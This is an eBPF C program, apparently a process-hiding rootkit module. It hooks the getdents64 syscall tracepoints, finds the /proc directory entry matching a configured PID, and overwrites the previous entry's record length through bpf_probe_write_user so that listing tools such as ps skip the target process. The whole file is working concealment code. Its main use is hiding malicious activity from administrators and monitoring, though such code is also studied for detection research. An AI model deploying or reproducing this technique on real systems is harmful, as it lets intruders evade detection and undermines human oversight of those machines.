
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>


#define PROG_01 1
#define PROG_02 2

char LICENSE[] SEC("license") = "Dual BSD/GPL";

// Ringbuffer Map to pass messages from kernel to user
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024 * 16);
} rb SEC(".maps");

// Map to fold the dents buffer addresses
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_buffs SEC(".maps");

// Map used to enable searching through the
// data in a loop
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, int);
} map_bytes_read SEC(".maps");

// Map with address of actual
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_to_patch SEC(".maps");

// Map to hold program tail calls
struct {
    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
    __uint(max_entries, 5);
    __type(key, __u32);
    __type(value, __u32);
} map_prog_array SEC(".maps");

struct event {
    int pid;
    u8 comm[TASK_COMM_LEN];
    bool success;
};
const struct event *unused __attribute__((unused));
// Optional Target Parent PID
//const volatile int target_ppid = 0;

// These store the string represenation
// of the PID to hide. This becomes the name
// of the folder in /proc/
const int max_pid_len = 10;
const volatile int pid_to_hide_len = 0;
const volatile char pid_to_hide[max_pid_len];


// struct linux_dirent64 {
//     u64        d_ino;    /* 64-bit inode number */
//     u64        d_off;    /* 64-bit offset to next structure */
//     unsigned short d_reclen; /* Size of this dirent */
//     unsigned char  d_type;   /* File type */
//     char           d_name[]; /* Filename (null-terminated) */ };
// int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);

SEC("tp/syscalls/sys_enter_getdents64")
int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx) {
    size_t pid_tgid = bpf_get_current_pid_tgid();
    //u8 commond[TASK_COMM_LEN];

    // Check if we're a process thread of interest

/*    if (target_ppid != 0) {
        struct task_struct *task = (struct task_struct *) bpf_get_current_task();
        int ppid = BPF_CORE_READ(task, real_parent, tgid);
        bpf_get_current_comm(&commond, sizeof(commond));
        if (commond[0] != 'p' && commond[1] != 's') {
            return 0;
        }
    }*/

    //bpf_printk("[PID_HIDE] get target_ppid %d", target_ppid);
    // Store params in map for exit function
    struct linux_dirent64 *dirp = (struct linux_dirent64 *) ctx->args[1];
    bpf_map_update_elem(&map_buffs, &pid_tgid, &dirp, BPF_ANY);
    return 0;
}


SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx) {
    u64 pid_tgid = bpf_get_current_pid_tgid();


    int total_bytes_read = ctx->ret;
    // if bytes_read is 0, everything's been read
    if (total_bytes_read <= 0) {
        return 0;
    }

    // Check we stored the address of the buffer from the syscall entry
    long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_buffs, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }
    //bpf_printk("enter");

    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp = 0;
    //int pid = pid_tgid >> 32;
    short unsigned int d_reclen = 0;
    char filename[max_pid_len];

    unsigned int bpos = 0;
    unsigned int *pBPOS = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);
    if (pBPOS != 0) {
        bpos = *pBPOS;
    }

    for (int i = 0; i < 200; i++) {
        if (bpos >= total_bytes_read) {
            break;
        }
        dirp = (struct linux_dirent64 *) (buff_addr + bpos);
        bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
        bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp->d_name);
        //bpf_printk("[PID_HIDE] filename:%s",filename);
        //bpf_core_read_user_str(&filename, pid_to_hide_len, dirp->d_name);
        int j = 0;
        for (j = 0; j < pid_to_hide_len; j++) {
            if (filename[j] != pid_to_hide[j]) {
                break;
            }
        }
        if (j == pid_to_hide_len) {
            // ***********
            // We've found the folder!!!
            // Jump to handle_getdents_patch so we can remove it!
            // ***********
            //bpf_printk("[PID_HIDE] find target pid folder");
            //bpf_printk("[PID_HIDE] filename:%s",filename);
            bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
            bpf_map_delete_elem(&map_buffs, &pid_tgid);
            bpf_tail_call(ctx, &map_prog_array, PROG_02);
        }
        bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp, BPF_ANY);
        bpos += d_reclen;
    }
    // If we didn't find it, but there's still more to read,
    // jump back the start of this function and keep looking
    if (bpos < total_bytes_read) {
        bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);
        bpf_tail_call(ctx, &map_prog_array, PROG_01);
    }
    bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
    bpf_map_delete_elem(&map_buffs, &pid_tgid);

    return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx) {
    // Only patch if we've already checked and found our pid's folder to hide
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_to_patch, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }

    // Unlink target, by reading in previous linux_dirent64 struct,
    // and setting it's d_reclen to cover itself and our target.
    // This will make the program skip over our folder.
    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp_previous = (struct linux_dirent64 *) buff_addr;
    short unsigned int d_reclen_previous = 0;
    bpf_probe_read_user(&d_reclen_previous, sizeof(d_reclen_previous), &dirp_previous->d_reclen);

    struct linux_dirent64 *dirp = (struct linux_dirent64 *) (buff_addr + d_reclen_previous);
    short unsigned int d_reclen = 0;
    bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);

    // Debug print
    char filename[max_pid_len];
    bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp_previous->d_name);
    filename[pid_to_hide_len - 1] = 0x00;
    bpf_printk("[PID_HIDE] filename previous %s\n", filename);
    bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp->d_name);
    filename[pid_to_hide_len - 1] = 0x00;
    bpf_printk("[PID_HIDE] filename next one %s\n", filename);

    // Attempt to overwrite
    short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
    long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));

    // Send an event
    struct event *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
    if (e) {
        e->success = (ret == 0);
        e->pid = (pid_tgid >> 32);
        bpf_get_current_comm(&e->comm, sizeof(e->comm));
        bpf_ringbuf_submit(e, 0);
    }


    bpf_map_delete_elem(&map_to_patch, &pid_tgid);
    return 0;
}